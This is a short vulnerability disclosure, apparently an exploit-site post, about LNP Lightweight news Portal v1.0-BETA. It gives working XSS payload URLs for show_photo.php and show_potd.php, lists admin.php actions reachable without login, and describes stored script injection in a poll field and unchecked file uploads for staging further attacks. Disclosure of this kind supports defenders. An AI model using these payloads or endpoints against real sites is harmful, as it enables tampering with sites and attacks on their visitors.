Exploit found by sToRm


LNP: Lightweight news Portal v1.0-BETA
Multiple Remote Vulnerabilities


Cross-Site Scripting
--------------------

show_photo.php?photo="><script>javascript:alert(document.domain)</script>
show_potd.php?potd="><script>javascript:alert(document.domain)</script>


Insecure Administration
-----------------------

The admin page faces us with a login, but many important functions are allowed
to be executed without a logged-in session.

admin.php?A=potd_delete
admin.php?A=potd
admin.php?A=vote_update
admin.php?A=vote
admin.php?A=modifynews


Permanent Code Injection
------------------------

admin.php?A=vote

"Current question" field allows for code injection, allowing us to force
all users browsing the poll to view an XSS or browser exploit.


File Upload
-----------

admin.php?A=potd

The "picture of the day" manager allows for further images to be
uploaded, but does not check for image validity. Although a phpshell
cannot be executed through this method, a source may be uploaded for
inclusion in further attacks, possibly an LFI somewhere on the server.
